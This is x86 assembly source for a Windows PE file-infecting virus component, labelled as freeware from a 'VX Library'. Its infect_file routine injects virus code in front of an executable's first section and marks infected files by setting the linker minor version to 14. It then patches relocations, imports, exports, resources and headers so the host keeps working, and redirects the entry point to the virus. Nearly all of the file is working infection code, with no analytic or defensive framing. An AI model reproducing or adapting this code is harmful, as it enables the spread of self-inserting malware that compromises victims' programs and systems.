;           First-Section File Infector (VX Library). Freeware
;           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;
;     OLD FILE:         NEW FILE:               Infection Method:
;   (PE exe/dll)                                ~~~~~~~~~~~~~~~~~
; 旼컴컴컴컴컴컴커  旼컴컴컴컴컴컴커
; � MZ-header    �  � MZ-header    �   � 2nd part of file (from CODE section)
; � PE-header    �  � PE-header    �     is displaced down
; � object table �  � object table �  潑 virus is inserted into file between
; 쳐.CODE컴컴컴컴�  쳐.CODE컴컴컴컴�  �    end-of-headers and first section
; � [CODE]       냄 � [VIRUS]      �캑� file to infect must have relocations
; � old_entry:   납 � new_entry:   �캑� all relocations within all the file
; 쳐컴컴컴컴컴컴캑� � jmp old_entry�켸    are modified
; � .DATA, ...   납 �- - - - - - - �   � PE hdr & .reloc section are modified
; 읕컴컴컴컴컴컴켸�� [CODE]       �   � resources (.rsrc), imports/exports
;                   � old_entry:   �       are modified if present
;                   쳐컴컴컴컴컴컴캑
;                   � .DATA, ...   �
;                   읕컴컴컴컴컴컴켸

; ---------------------------------------------------------------------------

; subroutine: infect_file
; input:      on the stack
; output:     CF=0  -- file infected, EAX = new file size
;             CF=1  -- alredy infected or an error occured

infect_file             proc    pascal

                        arg     _vir_old_eip      ; old eip ptr (rel2_vir_start)
                        arg     _vir_entry        ; vir entry (rel2_vir_start)
                        arg     _vir_size         ; vir size
                        arg     _vir_start        ; vir start
                        arg     _size             ; *size
                        arg     _fileptr          ; *data

                        local   _vir_size_aligned
                        local   _objtableptr
                        local   _resourcebase

                        pusha

                        mov     esi, _fileptr

                        mov     edi, [esi].mz_neptr
                        cmp     edi, _size
                        jae     __error

                        add     edi, esi

                        mov     eax, [edi]
                        neg     eax
                        cmp     eax, -'EP'
                        jne     __error

                        cmp     [edi].pe_entrypointrva, 0
                        je      __error

; *** 'alredy-infected?'-check is here ***
                        cmp     [edi].pe_linkminor, 14
                        je      __error
                        mov     [edi].pe_linkminor, 14

                        test    [edi].pe_exeflags, 1  ; need relocs
                        jnz     __error

; infecting. WARNING: after any modification, no way to 'Jxx __error' there

; calculate file-and-object-aligned _vir_size

                        mov     eax, _vir_size

                        mov     ecx, [edi].pe_filealign
                        dec     ecx
                        add     eax, ecx
                        not     ecx
                        and     eax, ecx

                        mov     ecx, [edi].pe_objectalign
                        dec     ecx
                        add     eax, ecx
                        not     ecx
                        and     eax, ecx

                        mov     _vir_size_aligned, eax

; calculate object table offset
                        movzx   eax, [edi].pe_ntheadersize
                        lea     eax, [edi+eax+18h]
                        mov     _objtableptr, eax

; fix resources (.rsrc) if present
                        cmp     [edi].pe_resourcetablerva, 0
                        je      __skipfixres

                        push    [edi].pe_resourcetablerva
                        call    __virt2phys
                        pop     edx
                        mov     _resourcebase, edx
                        call    __fix_rsrc
__skipfixres:

; fix relocs
                        push    [edi].pe_fixuptablerva
                        call    __virt2phys
                        pop     ebx

                        mov     edx, [edi].pe_fixuptablesize
                        add     edx, ebx

__rel_cycle:            pusha

                        push    dword ptr [ebx]
                        call    __virt2phys
                        pop     esi

                        mov     ecx, [ebx+4]
                        sub     ecx, 8
                        add     ebx, 8

__rel_fix:              or      ecx, ecx
                        jz      __rel_end

                        mov     eax, [ebx]
                        shr     ah, 4
                        cmp     ah, 3
                        jne     __rel_skip

                        mov     eax, [ebx]
                        and     eax, 0FFFh

                        mov     edx, _vir_size_aligned
                        add     [esi+eax], edx
__rel_skip:
                        add     ebx, 2
                        sub     ecx, 2
                        jmp     __rel_fix
__rel_end:
                        popa

                        mov     eax, _vir_size_aligned  ; fix page rva
                        add     [ebx], eax

                        add     ebx, [ebx+4]
                        cmp     ebx, edx
                        jb      __rel_cycle

; fix import table
                        mov     ecx, [edi].pe_importtablerva
                        jecxz   __skipfiximp

                        push    ecx
                        call    __virt2phys
                        pop     ebx

                        mov     eax, _vir_size_aligned

__imp_cycle:            cmp     dword ptr [ebx], 0
                        je      __imp_exit

                        push    dword ptr [ebx+00h]
                        call    __virt2phys
                        pop     ecx

__imp1_cycle:           cmp     dword ptr [ecx], 0
                        je      __imp1_exit
                        add     [ecx], eax
                        add     ecx, 4
                        jmp     __imp1_cycle
__imp1_exit:
                        add     [ebx+00h], eax
                        add     [ebx+0Ch], eax
                        add     [ebx+10h], eax

                        add     ebx, 14h
                        jmp     __imp_cycle
__imp_exit:
__skipfiximp:

; fix export table
                        mov     ecx, [edi].pe_exporttablerva
                        jecxz   __skipfixexp

                        push    ecx
                        call    __virt2phys
                        pop     ebx

                        mov     eax, _vir_size_aligned
                        add     [ebx].ex_namerva, eax

                        push    [ebx].ex_addresstablerva
                        call    __virt2phys
                        pop     edx
                        mov     ecx, [ebx].ex_numoffunctions
__fixexp1:              jecxz   __fixexp1x
                        add     [edx], eax
                        add     edx, 4
                        dec     ecx
                        jmp     __fixexp1
__fixexp1x:
                        push    [ebx].ex_namepointersrva
                        call    __virt2phys
                        pop     edx
                        mov     ecx, [ebx].ex_numofnamepointers
__fixexp2:              jecxz   __fixexp2x
                        add     [edx], eax
                        add     edx, 4
                        dec     ecx
                        jmp     __fixexp2
__fixexp2x:
                        add     [ebx].ex_addresstablerva, eax
                        add     [ebx].ex_namepointersrva, eax
                        add     [ebx].ex_ordinaltablerva, eax
__skipfixexp:

; fix object table
                        mov     ebx, _objtableptr
                        movzx   ecx, [edi].pe_numofobjects ; ecx = objcount

                        mov     eax, _vir_size_aligned
                        add     [ebx].oe_phys_size, eax
                        add     [ebx].oe_virt_size, eax

__obj_cycle:            add     ebx, size oe_struc
                        dec     ecx
                        jz      __obj_end
                        add     [ebx].oe_phys_offs, eax
                        add     [ebx].oe_virt_rva, eax
                        jmp     __obj_cycle
__obj_end:

; fix entrypointrva
                        mov     eax, _vir_size_aligned
                        add     [edi].pe_entrypointrva, eax

; fix other PE header entries

                        add     [edi].pe_sizeofcode, eax
                        add     [edi].pe_imagesize, eax
                        add     [edi].pe_baseofdatarva, eax

; fix PE rvas
                        lea     ebx, [edi].pe_rvasizes
                        mov     ecx, [edi].pe_numofrvaandsizes
                        mov     eax, _vir_size_aligned

__rva_cycle:            cmp     dword ptr [ebx], 0
                        je      __rva_skip
                        add     dword ptr [ebx], eax

__rva_skip:             add     ebx, 8
                        loop    __rva_cycle

; move 2nd part of file forward

                        pusha

                        mov     ecx, _size
                        mov     eax, _objtableptr
                        sub     ecx, [eax].oe_phys_offs

                        add     esi, _size
                        mov     edi, esi
                        add     edi, _vir_size_aligned

                        dec     esi
                        dec     edi

                        std
                        rep     movsb
                        cld

; copy our code into file
                        mov     edi, _objtableptr
                        mov     edi, [edi].oe_phys_offs
                        add     edi, _fileptr
                        mov     esi, _vir_start
                        mov     ecx, _vir_size
                        ;;
                        call    uncall_range    ; restore all VxDcalls
                        ;;
                        rep     movsb
                        mov     ecx, _vir_size_aligned
                        sub     ecx, _vir_size
                        xor     eax, eax
                        rep     stosb
                        popa

; set our entrypoint

                        mov     eax, _objtableptr
                        mov     eax, [eax].oe_virt_rva
                        mov     edx, eax
                        add     edx, _vir_entry
                        xchg    edx, [edi].pe_entrypointrva

                        add     eax, _vir_old_eip
                        sub     edx, eax
                        sub     edx, 4

                        push    eax
                        call    __virt2phys
                        pop     eax

                        mov     [eax], edx

; set popa.EAX = new file size
                        mov     eax, _size
                        add     eax, _vir_size_aligned
                        mov     [esp+7*4], eax

; return success (CF=0)
                        clc
                        jmp     __quit

; return error (CF=1)
__error:                stc

__quit:                 popa
                        ret

__virt2phys:            pusha

                        mov     esi, [esp+32+4]

                        movzx   ecx, [edi].pe_numofobjects ; ecx = objcount
                        mov     ebx, _objtableptr

__v2p_cycle:            mov     eax, esi
                        sub     eax, [ebx].oe_virt_rva
                        jc      __v2p_cont
                        cmp     eax, [ebx].oe_phys_size
                        jae     __v2p_cont
                        add     eax, [ebx].oe_phys_offs
                        xchg    esi, eax
                        clc
                        jmp     __v2p_exit

__v2p_cont:             add     ebx, size oe_struc
                        dec     ecx
                        jnz     __v2p_cycle

                        stc

__v2p_exit:             add     esi, _fileptr
                        mov     [esp+32+4], esi

                        popa
                        retn

; input: EDX = rsrc offset

__fix_rsrc:             movzx   ecx, word ptr [edx+0Ch]
                        movzx   eax, word ptr [edx+0Eh]
                        add     ecx, eax

                        lea     ebx, [edx+10h]

__rsrc_cycle:           jecxz   __rsrc_end

                        mov     eax, [ebx+4]
                        btr     eax, 31
                        jnc     __x_data

                        pusha
                        mov     edx, eax
                        add     edx, _resourcebase
                        call    __fix_rsrc
                        popa

                        jmp     __x_both
__x_data:
                        add     eax, _resourcebase
                        push    ecx
                        mov     ecx, _vir_size_aligned
                        add     [eax], ecx
                        pop     ecx
__x_both:
                        add     ebx, 8
                        dec     ecx
                        jmp     __rsrc_cycle

__rsrc_end:             retn

                        endp

; ---------------------------------------------------------------------------
